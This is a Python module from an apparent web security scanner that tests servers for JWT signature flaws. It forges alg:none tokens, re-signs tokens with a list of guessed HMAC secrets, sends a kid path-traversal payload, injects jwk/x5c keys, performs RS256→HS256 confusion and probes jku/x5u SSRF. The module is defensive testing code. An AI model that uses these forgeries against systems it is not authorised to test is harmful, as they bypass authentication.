"""Active detectors for JWT signature weaknesses (CWE-347 / OWASP API2:2023).

When a scan carries a JWT bearer, these:
  * forge an `alg:none`/unsigned variant and check whether the server accepts it; and
  * try re-signing the token with a list of common HMAC secrets (HS256/384/512).

Both are false-positive-safe via a *bad-signature* control: the finding only fires when
the server rejects a tampered signature (proving it verifies at all) but accepts the
forged/weakly-signed token — otherwise the endpoint just isn't checking auth.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
from urllib.parse import urljoin, urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
from dastcore.engine.oast import OastProvider

# alg values that bypass signature verification in a broken parser, most→least common.
_NONE_ALGS = ("none", "None", "NONE", "nOnE")

# HMAC algorithms whose secret we can brute against a small list.
_HS_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# Common/default HMAC signing secrets seen in the wild and in framework tutorials.
_WEAK_SECRETS = (
    "secret",
    "password",
    "changeme",
    "admin",
    "jwt",
    "key",
    "test",
    "123456",
    "secretkey",
    "your-256-bit-secret",
    "private",
    "supersecret",
    "token",
    "mysecret",
)


def _b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def looks_like_jwt(token: str) -> bool:
    """True if `token` is a three-segment JWT whose header decodes to JSON with an `alg`."""
    parts = token.split(".")
    if len(parts) != 3 or not parts[2]:
        return False
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (ValueError, json.JSONDecodeError):
        return False
    return isinstance(header, dict) and "alg" in header


def forge_alg_none(token: str, alg: str = "none") -> str:
    """Return the token rewritten with an `alg:none` header, the same payload, no signature."""
    parts = token.split(".")
    header = _b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    return f"{header}.{parts[1]}."


def forge_bad_signature(token: str) -> str:
    """Return the token with its signature altered to a valid-shaped but wrong value.

    Flips the *first* signature character: base64url's leading char carries all six bits,
    so this always changes the decoded first byte. (The trailing char can carry only a few
    significant bits — e.g. for a 256-byte RSA signature — so flipping it may decode to the
    same bytes and leave the signature still valid.)"""
    parts = token.split(".")
    sig = parts[2]
    flipped = "B" if sig[0] != "B" else "C"
    return f"{parts[0]}.{parts[1]}.{flipped}{sig[1:]}"


# A bearer that is *not* a JWT at all — used to tell "the server ignores the signature"
# (a JWT-shaped forgery is accepted) from "the endpoint just isn't authenticated".
_GARBAGE_BEARER = "dastcore-not-a-jwt"

# A kid that traverses to an empty/known file; if the server loads the signing key from it,
# the key is empty, so an HMAC signed with an empty secret verifies.
_KID_TRAVERSAL = "../../../../../../../../../../dev/null"


def _header_of(token: str) -> dict:
    try:
        header = json.loads(_b64url_decode(token.split(".")[0]))
        return header if isinstance(header, dict) else {}
    except (ValueError, json.JSONDecodeError, IndexError):
        return {}


def _sign_with_header(header: dict, token: str, secret: bytes) -> str:
    """Rebuild a token with a new header and an HMAC-SHA256 signature over it (given secret)."""
    payload = token.split(".")[1]
    head = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signature = _b64url_encode(hmac.new(secret, f"{head}.{payload}".encode(), hashlib.sha256).digest())
    return f"{head}.{payload}.{signature}"


def forge_kid_empty_key(token: str) -> str:
    """Force HS256 with a traversal `kid` and sign with an empty key (the /dev/null trick)."""
    return _sign_with_header({"alg": "HS256", "kid": _KID_TRAVERSAL, "typ": "JWT"}, token, b"")


def forge_alg_confusion(token: str, public_key_pem: bytes) -> str:
    """RS256→HS256 confusion: sign HS256 using the RSA *public* key (PEM) as the HMAC secret."""
    return _sign_with_header({"alg": "HS256", "typ": "JWT"}, token, public_key_pem)


def _point(request: HttpRequest) -> InjectionPoint:
    return InjectionPoint(location="header", name="Authorization", base_value="", request_template=request)


async def _send_bearer(client: HttpClient, target_url: str, bearer: str) -> HttpResponse | None:
    try:
        return await client.request("GET", target_url, headers={"Authorization": f"Bearer {bearer}"})
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _hmac_sign(token: str, secret: str, alg_fn) -> str:
    """Re-sign a token's header.payload with an HMAC secret, returning the new token."""
    header, payload, _ = token.split(".")
    signature = _b64url_encode(hmac.new(secret.encode(), f"{header}.{payload}".encode(), alg_fn).digest())
    return f"{header}.{payload}.{signature}"


async def check_jwt_none_acceptance(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """Report a server that accepts an `alg:none`/unsigned JWT while rejecting a bad signature."""
    if not looks_like_jwt(token):
        return []

    async def _get(bearer: str) -> HttpResponse | None:
        return await _send_bearer(client, target_url, bearer)

    original = await _get(token)
    if original is None or original.status_code >= 400:
        return []  # the real token isn't authorized here — nothing to compare against

    bad = await _get(forge_bad_signature(token))
    if bad is None or bad.status_code < 400:
        return []  # a wrong signature is accepted too -> the endpoint isn't verifying at all

    for alg in _NONE_ALGS:
        forged = await _get(forge_alg_none(token, alg))
        if forged is not None and forged.status_code < 400:
            request = HttpRequest(method="GET", url=target_url, headers={"Authorization": "Bearer <alg:none JWT>"})
            return [
                Finding(
                    id=f"jwt-alg-none:GET:{target_url}",
                    rule_id="jwt-alg-none",
                    name="JWT signature not verified (alg:none accepted)",
                    severity="high",
                    cwe="CWE-347",
                    owasp="API2:2023-Broken Authentication",
                    family="jwt",
                    injection_point=_point(request),
                    evidence=[
                        Evidence(
                            type="differential",
                            data=(
                                f"unsigned token (alg={alg!r}) accepted ({forged.status_code}) while a "
                                f"tampered signature was rejected ({bad.status_code})"
                            ),
                            confidence="high",
                        )
                    ],
                    request=request,
                    response=forged,
                    remediation=(
                        "Verify the JWT signature with a fixed, server-side algorithm allow-list (e.g. only "
                        "RS256 or HS256). Reject alg:none and any algorithm the server did not issue; never "
                        "trust the alg header from the token."
                    ),
                )
            ]
    return []


def _accepted(response: HttpResponse | None) -> bool:
    return response is not None and response.status_code < 400


async def _verifies_signatures(
    client: HttpClient, target_url: str, token: str
) -> tuple[HttpResponse, HttpResponse] | None:
    """Return (original, bad-signature) responses when the server *does* verify signatures
    (original authorized, a tampered signature rejected), else None. The precondition for the
    kid/algorithm-confusion checks — otherwise a forgery being accepted proves nothing."""
    original = await _send_bearer(client, target_url, token)
    if original is None or original.status_code >= 400:
        return None
    bad = await _send_bearer(client, target_url, forge_bad_signature(token))
    if bad is None or bad.status_code < 400:
        return None  # a wrong signature is accepted → signature-not-verified handles this
    return original, bad


def _jwt_finding(rule_id: str, name: str, severity: str, target_url: str, data: str, response: HttpResponse) -> Finding:
    request = HttpRequest(method="GET", url=target_url, headers={"Authorization": "Bearer <forged JWT>"})
    return Finding(
        id=f"{rule_id}:GET:{target_url}",
        rule_id=rule_id,
        name=name,
        severity=severity,  # type: ignore[arg-type]
        cwe="CWE-347",
        owasp="API2:2023-Broken Authentication",
        family="jwt",
        injection_point=_point(request),
        evidence=[Evidence(type="differential", data=data[:200], confidence="high")],
        request=request,
        response=response,
        remediation=(
            "Verifica la firma del JWT con una allow-list fija de algoritmos server-side y una clave "
            "de alta entropía; ignora los campos `alg`/`kid`/`jku` del token para elegir clave o "
            "algoritmo, y rechaza cualquier token cuya firma no valide. Rota las claves comprometidas."
        ),
    )


async def check_jwt_signature_not_verified(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """Report a server that parses a JWT but never verifies its signature (so any claim —
    role, scope, sub — can be tampered). Confirmed differentially: a JWT with a *wrong*
    signature is accepted, while a non-JWT garbage bearer is rejected (ruling out a simply
    unauthenticated endpoint)."""
    if not looks_like_jwt(token):
        return []
    if not _accepted(await _send_bearer(client, target_url, token)):
        return []
    if _accepted(await _send_bearer(client, target_url, _GARBAGE_BEARER)):
        return []  # a non-JWT bearer is accepted → the endpoint just isn't authenticated
    bad = await _send_bearer(client, target_url, forge_bad_signature(token))
    if not _accepted(bad):
        return []  # a wrong signature is rejected → it does verify
    return [
        _jwt_finding(
            "jwt-signature-not-verified",
            "JWT signature not verified (claims can be tampered)",
            "high",
            target_url,
            f"a JWT with a tampered signature was accepted ({bad.status_code}) while a non-JWT bearer was "
            "rejected — the server reads the claims without verifying the signature",
            bad,
        )
    ]


async def check_jwt_kid_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """Report `kid` header injection: a traversal `kid` pointing at an empty file (/dev/null)
    with an empty-key HMAC signature is accepted while a tampered signature is rejected — the
    server loads the signing key from an attacker-controlled path."""
    if not looks_like_jwt(token):
        return []
    control = await _verifies_signatures(client, target_url, token)
    if control is None:
        return []
    _, bad = control
    forged = await _send_bearer(client, target_url, forge_kid_empty_key(token))
    if not _accepted(forged):
        return []
    return [
        _jwt_finding(
            "jwt-kid-injection",
            "JWT kid header injection (attacker-controlled signing key)",
            "high",
            target_url,
            f"a token with a path-traversal kid and an empty-key HMAC signature was accepted "
            f"({forged.status_code}) while a tampered signature was rejected ({bad.status_code})",
            forged,
        )
    ]


def _b64uint(value: int) -> str:
    return _b64url_encode(value.to_bytes((value.bit_length() + 7) // 8 or 1, "big"))


def _rsa_forge(token: str, header_extra: dict) -> str | None:
    """Sign the token's (unchanged) payload with a fresh RSA key via RS256, adding ``header_extra``
    (the ``jwk``/``x5c`` that carries our public key). None if `cryptography` isn't available."""
    try:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding, rsa
    except ImportError:
        return None
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    header = {"alg": "RS256", "typ": "JWT", **header_extra(key)}  # type: ignore[operator]
    payload_b64 = token.split(".")[1]
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signature = key.sign(f"{header_b64}.{payload_b64}".encode(), padding.PKCS1v15(), hashes.SHA256())
    return f"{header_b64}.{payload_b64}.{_b64url_encode(signature)}"


def _jwk_header(key) -> dict:  # noqa: ANN001 — key is an rsa.RSAPrivateKey
    nums = key.public_key().public_numbers()
    return {"jwk": {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "dc-jwk",
                    "n": _b64uint(nums.n), "e": _b64uint(nums.e)}}


def _x5c_header(key) -> dict:  # noqa: ANN001 — key is an rsa.RSAPrivateKey
    import datetime

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.x509.oid import NameOID

    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "dastcore")])
    now = datetime.datetime.now(datetime.UTC)
    cert = (
        x509.CertificateBuilder().subject_name(name).issuer_name(name)
        .public_key(key.public_key()).serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1)).not_valid_after(now + datetime.timedelta(days=1))
        .sign(key, hashes.SHA256())
    )
    der = cert.public_bytes(serialization.Encoding.DER)
    return {"x5c": [base64.b64encode(der).decode("ascii")]}  # x5c uses standard base64 (RFC 7515)


async def _check_embedded_key(
    client: HttpClient, target_url: str, token: str, *, header_extra: dict, rule_id: str, name: str
) -> list[Finding]:
    """Shared oracle for jwk/x5c injection: the server must verify signatures (bad one rejected), and
    then accept a token signed by *our* key carried in the token's own header → attacker can forge any token."""
    if not looks_like_jwt(token):
        return []
    control = await _verifies_signatures(client, target_url, token)
    if control is None:
        return []
    _, bad = control
    forged = _rsa_forge(token, header_extra)  # type: ignore[arg-type]
    if forged is None:
        return []
    resp = await _send_bearer(client, target_url, forged)
    if not _accepted(resp):
        return []
    assert resp is not None
    return [_jwt_finding(
        rule_id, name, "critical", target_url,
        f"a token signed with an attacker key supplied in the token's own header was accepted "
        f"({resp.status_code}) while a tampered signature was rejected ({bad.status_code}) — the server "
        "trusts the key embedded in the JWT, so any token (any role/sub) can be forged",
        resp,
    )]


async def check_jwt_jwk_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """`jwk` header injection: the server verifies against the RSA public key embedded in the token."""
    return await _check_embedded_key(
        client, target_url, token, header_extra=_jwk_header,  # type: ignore[arg-type]
        rule_id="jwt-jwk-injection", name="JWT jwk header injection (attacker-supplied signing key)",
    )


async def check_jwt_x5c_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """`x5c` header injection: the server trusts a self-signed certificate chain carried in the token."""
    return await _check_embedded_key(
        client, target_url, token, header_extra=_x5c_header,  # type: ignore[arg-type]
        rule_id="jwt-x5c-injection", name="JWT x5c header injection (self-signed cert trusted)",
    )


def _jwk_to_pem(jwk: dict) -> bytes | None:
    """Reconstruct an RSA public key PEM from a JWK (n, e). Needs `cryptography`; None if
    unavailable or the JWK isn't a usable RSA key."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    except ImportError:
        return None
    if jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
        return None
    try:
        n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
        public_key = RSAPublicNumbers(e, n).public_key()
        return public_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    except (ValueError, TypeError):
        return None


def _rsa_jwk_from_jwks(text: str, kid: str | None) -> dict | None:
    try:
        data = json.loads(text)
    except (ValueError, json.JSONDecodeError):
        return None
    keys = data.get("keys") if isinstance(data, dict) else None
    if not isinstance(keys, list):
        return None
    rsa_keys = [k for k in keys if isinstance(k, dict) and k.get("kty") == "RSA"]
    if kid is not None:
        for key in rsa_keys:
            if key.get("kid") == kid:
                return key
    return rsa_keys[0] if rsa_keys else None


async def _discover_public_key_pem(client: HttpClient, target_url: str, token: str) -> bytes | None:
    """Find the server's RSA public key from standard JWKS locations (and the token's own
    `jku`), reconstructed to PEM — the material for an RS256→HS256 confusion forgery."""
    header = _header_of(token)
    kid = header.get("kid")
    parts = urlsplit(target_url)
    origin = f"{parts.scheme}://{parts.netloc}/"
    candidates: list[str] = []
    if isinstance(header.get("jku"), str):
        candidates.append(header["jku"])  # client enforces scope on the fetch
    candidates += [urljoin(origin, p) for p in (".well-known/jwks.json", "jwks.json")]

    for url in candidates:
        try:
            response = await client.get(url)
        except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
            continue
        if response.status_code != 200:
            continue
        jwk = _rsa_jwk_from_jwks(response.text, kid)
        if jwk is not None:
            pem = _jwk_to_pem(jwk)
            if pem is not None:
                return pem
    return None


async def check_jwt_algorithm_confusion(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """RS256→HS256 algorithm confusion: if the token is RS*, fetch the server's RSA public
    key (JWKS) and forge an HS256 token signed with that public key as the HMAC secret. A
    naive verifier that trusts the token's `alg` and reuses one key for both will accept it.
    Gated by the same bad-signature control so it can't fire on a non-verifying endpoint."""
    if not looks_like_jwt(token):
        return []
    if not str(_header_of(token).get("alg", "")).upper().startswith("RS"):
        return []  # only asymmetric RS* tokens are confusable into HS*
    control = await _verifies_signatures(client, target_url, token)
    if control is None:
        return []
    _, bad = control
    public_key_pem = await _discover_public_key_pem(client, target_url, token)
    if public_key_pem is None:
        return []  # no public key discoverable (or `cryptography` not installed) — can't forge
    forged = await _send_bearer(client, target_url, forge_alg_confusion(token, public_key_pem))
    if not _accepted(forged):
        return []
    return [
        _jwt_finding(
            "jwt-alg-confusion",
            "JWT algorithm confusion (RS256 → HS256 with the public key)",
            "critical",
            target_url,
            f"an HS256 token signed with the RSA public key was accepted ({forged.status_code}) while a "
            f"tampered signature was rejected ({bad.status_code}) — the verifier trusts the token's alg",
            forged,
        )
    ]


async def check_jwt_weak_secret(client: HttpClient, target_url: str, token: str) -> list[Finding]:
    """Report an HS256/384/512 JWT signed with a guessable secret.

    Re-signs the token with each candidate secret and checks acceptance, gated by the
    same bad-signature control so it can't fire on an endpoint that ignores auth."""
    if not looks_like_jwt(token):
        return []
    try:
        alg = json.loads(_b64url_decode(token.split(".")[0])).get("alg", "")
    except (ValueError, json.JSONDecodeError):
        return []
    alg_fn = _HS_ALGS.get(alg)
    if alg_fn is None:  # not an HMAC token — the secret can't be brute-forced this way
        return []

    original = await _send_bearer(client, target_url, token)
    if original is None or original.status_code >= 400:
        return []
    bad = await _send_bearer(client, target_url, forge_bad_signature(token))
    if bad is None or bad.status_code < 400:
        return []  # a wrong signature is accepted -> not verifying; different finding

    for secret in _WEAK_SECRETS:
        resp = await _send_bearer(client, target_url, _hmac_sign(token, secret, alg_fn))
        if resp is not None and resp.status_code < 400:
            request = HttpRequest(method="GET", url=target_url, headers={"Authorization": "Bearer <re-signed JWT>"})
            return [
                Finding(
                    id=f"jwt-weak-secret:GET:{target_url}",
                    rule_id="jwt-weak-secret",
                    name="JWT signed with a weak/guessable secret",
                    severity="high",
                    cwe="CWE-347",
                    owasp="API2:2023-Broken Authentication",
                    family="jwt",
                    injection_point=_point(request),
                    evidence=[
                        Evidence(
                            type="differential",
                            data=(
                                f"a token re-signed with the guessed {alg} secret {secret!r} was accepted "
                                f"({resp.status_code}) while a tampered signature was rejected ({bad.status_code})"
                            ),
                            confidence="high",
                        )
                    ],
                    request=request,
                    response=resp,
                    remediation=(
                        "Sign JWTs with a long, high-entropy secret (or an RS256 private key) stored server-side, "
                        "never a dictionary word or framework default. Rotate the secret and invalidate old tokens."
                    ),
                )
            ]
    return []


# URL-valued JWT header parameters that tell the verifier where to fetch the key material.
_KEY_URL_HEADERS = ("jku", "x5u")


def _forge_header_url(token: str, field: str, url: str) -> str:
    """A token whose ``jku``/``x5u`` header points at our URL. The verifier fetches the key set
    to *resolve the key* — which happens before (or regardless of) signature verification — so
    the now-invalid signature doesn't matter; the outbound fetch is the SSRF we're confirming."""
    parts = token.split(".")
    header = _header_of(token)
    header[field] = url
    head_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload = parts[1] if len(parts) > 1 else ""
    signature = parts[2] if len(parts) > 2 else ""
    return f"{head_b64}.{payload}.{signature}"


async def _collect_callbacks(oast: OastProvider, tokens: set[str], attempts: int, delay: float) -> set[str]:
    """Poll the collaborator until every token has called back or the attempts run out."""
    hits: set[str] = set()
    for _ in range(attempts):
        for interaction in await oast.poll():
            if interaction.token in tokens:
                hits.add(interaction.token)
        if hits >= tokens:
            break
        await asyncio.sleep(delay)
    return hits


def _jku_ssrf_finding(field: str, target_url: str, url: str) -> Finding:
    request = HttpRequest(
        method="GET", url=target_url, headers={"Authorization": f"Bearer <JWT with {field}=OAST URL>"}
    )
    return Finding(
        id=f"jwt-{field}-ssrf:GET:{target_url}",
        rule_id=f"jwt-{field}-ssrf",
        name=f"Blind SSRF via JWT '{field}' header (key-set URL fetch)",
        severity="high",
        cwe="CWE-918",
        owasp="API2:2023-Broken Authentication",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        family="ssrf",
        injection_point=_point(request),
        evidence=[
            Evidence(
                type="oob",
                data=(
                    f"the server fetched the attacker-controlled '{field}' URL from the JWT header (out-of-band "
                    f"callback to {url}) — it resolves the verification key from a URL in the token without an "
                    "allowlist, so a forged token drives server-side requests (SSRF), and enables key injection"
                )[:200],
                confidence="high",
            )
        ],
        request=request,
        response=HttpResponse(status_code=0),
        remediation=(
            "Nunca resuelvas la clave de verificación desde una URL contenida en el token. Fija el JWKS/"
            "certificado server-side (o una allowlist estricta de hosts para `jku`/`x5u`) e ignora esos "
            "campos del atacante. Valida la firma contra la clave de confianza, no contra la que indica el token."
        ),
    )


async def check_jwt_key_url_ssrf(
    client: HttpClient,
    target_url: str,
    token: str,
    oast: OastProvider | None,
    *,
    poll_attempts: int = 8,
    poll_delay: float = 0.4,
) -> list[Finding]:
    """Confirm SSRF/key-injection via the JWT ``jku``/``x5u`` header, out-of-band.

    Forge a token whose key-set URL points at a unique OAST handle; if the server fetches it,
    the callback confirms it resolves the verification key from an attacker-controlled URL —
    zero false positives, since only a real outbound request produces the correlated callback.
    Requires an OAST collaborator (``--oast local|interactsh``); a no-op without one."""
    if not looks_like_jwt(token) or oast is None or not oast.is_available():
        return []
    handles = {field: oast.new_handle() for field in _KEY_URL_HEADERS}
    for field, handle in handles.items():
        await _send_bearer(client, target_url, _forge_header_url(token, field, handle.url))
    hits = await _collect_callbacks(oast, {h.token for h in handles.values()}, poll_attempts, poll_delay)
    return [
        _jku_ssrf_finding(field, target_url, handle.url) for field, handle in handles.items() if handle.token in hits
    ]
